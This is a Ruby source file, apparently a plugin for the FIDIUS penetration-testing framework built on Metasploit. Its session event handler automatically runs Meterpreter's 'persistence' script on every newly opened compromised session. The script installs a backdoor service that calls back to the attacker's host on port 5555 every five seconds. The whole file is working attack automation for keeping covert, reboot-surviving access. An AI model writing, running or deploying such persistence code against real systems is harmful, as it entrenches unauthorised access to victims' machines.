module FIDIUS

module Session

  class MsfSessionEvent
    include ::Msf::SessionEvent

    def on_session_open(session)
      puts("on_session_open #{session}")
      FIDIUS::Session::session_action session
    end

    def on_session_close(session, reason='')
      puts("on_session_close #{session}")
    end

    def on_session_command(session, command)
      puts("on_session_command #{session} #{command}")
    end
  end

  def self.session_action session
    thread = Thread.new do
      begin      
        session.load_stdapi
        install_meterpreter session
      rescue ::Exception
        puts("problem in session_action: #{$!} #{$!.backtrace}")
      end
    end
  end

  def self.install_meterpreter session
    script_path = Msf::Sessions::Meterpreter.find_script_path("persistence")
    rhost = session.exploit_datastore["RHOST"]
    rhost = (rhost != nil and !rhost.empty?) ? rhost : session.target_host
    lhost = Rex::Socket.source_address((rhost != nil and !rhost.empty?) ? rhost : "1.2.3.4");
    args = "-S -i 5 -p 5555 -r #{lhost}"
    puts "run: #{script_path} #{args}"
    session.execute_file(script_path, args)
  end

end end
